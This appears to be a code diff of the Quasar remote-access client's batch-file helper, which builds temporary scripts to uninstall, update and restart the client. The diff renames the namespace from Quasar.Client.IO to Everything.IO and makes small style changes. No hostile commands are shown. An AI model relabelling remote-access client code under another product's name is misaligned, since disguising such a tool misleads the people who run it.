@@ -2,7 +2,7 @@
 using System.IO;
 using System.Text;
 
-namespace Quasar.Client.IO
+namespace Everything.IO
 {
     /// <summary>
     /// Provides methods to create batch files for application update, uninstall and restart operations.
@@ -16,9 +16,9 @@ namespace Quasar.Client.IO
         /// <returns>The file path to the batch file which can then get executed. Returns <c>string.Empty</c> on failure.</returns>
         public static string CreateUninstallBatch(string currentFilePath)
         {
-            string batchFile = FileHelper.GetTempFilePath(".bat");
+            var batchFile = FileHelper.GetTempFilePath(".bat");
 
-            string uninstallBatch =
+            var uninstallBatch =
                 "@echo off" + "\r\n" +
                 "chcp 65001" + "\r\n" + // Unicode path support for cyrillic, chinese, ...
                 "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
@@ -38,9 +38,9 @@ namespace Quasar.Client.IO
         /// <returns>The file path to the batch file which can then get executed. Returns an empty string on failure.</returns>
         public static string CreateUpdateBatch(string currentFilePath, string newFilePath)
         {
-            string batchFile = FileHelper.GetTempFilePath(".bat");
+            var batchFile = FileHelper.GetTempFilePath(".bat");
 
-            string updateBatch =
+            var updateBatch =
                 "@echo off" + "\r\n" +
                 "chcp 65001" + "\r\n" + // Unicode path support for cyrillic, chinese, ...
                 "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
@@ -61,9 +61,9 @@ namespace Quasar.Client.IO
         /// <returns>The file path to the batch file which can then get executed. Returns <c>string.Empty</c> on failure.</returns>
         public static string CreateRestartBatch(string currentFilePath)
         {
-            string batchFile = FileHelper.GetTempFilePath(".bat");
+            var batchFile = FileHelper.GetTempFilePath(".bat");
 
-            string restartBatch =
+            var restartBatch =
                 "@echo off" + "\r\n" +
                 "chcp 65001" + "\r\n" + // Unicode path support for cyrillic, chinese, ...
                 "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
